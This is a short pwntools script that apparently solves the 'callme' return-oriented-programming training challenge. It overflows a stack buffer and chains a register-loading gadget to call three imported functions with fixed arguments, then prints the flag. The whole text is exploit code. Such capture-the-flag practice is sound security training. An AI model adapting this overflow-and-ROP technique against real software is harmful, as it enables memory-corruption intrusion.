from pwn import *

callme = ELF('callme')

#  arg1=rdi, arg2=rsi, arg3=rdx
#  0x00401ab0                 5f  pop rdi
#  0x00401ab1                 5e  pop rsi
#  0x00401ab2                 5a  pop rdx
#  0x00401ab3                 c3  ret
load_regs_ret = p64(0x00401ab0)

rop_chain = "Z"*40              # overwrite rip

rop_chain += load_regs_ret      # load arguments
rop_chain += p64(1)             # arg 1
rop_chain += p64(2)             # arg 2
rop_chain += p64(3)             # arg 3
rop_chain += p64(0x00401850)    # sym.imp.callme_one

rop_chain += load_regs_ret      # load arguments
rop_chain += p64(1)             # arg 1
rop_chain += p64(2)             # arg 2
rop_chain += p64(3)             # arg 3
rop_chain += p64(0x00401870)    # sym.imp.callme_two

rop_chain += load_regs_ret      # load arguments
rop_chain += p64(1)             # arg 1
rop_chain += p64(2)             # arg 2
rop_chain += p64(3)             # arg 3
rop_chain += p64(0x00401810)    # sym.imp.callme_three

p = process(callme.path)
p.recvuntil('> ')
p.sendline(rop_chain)
flag = p.recv()
print ""
print flag
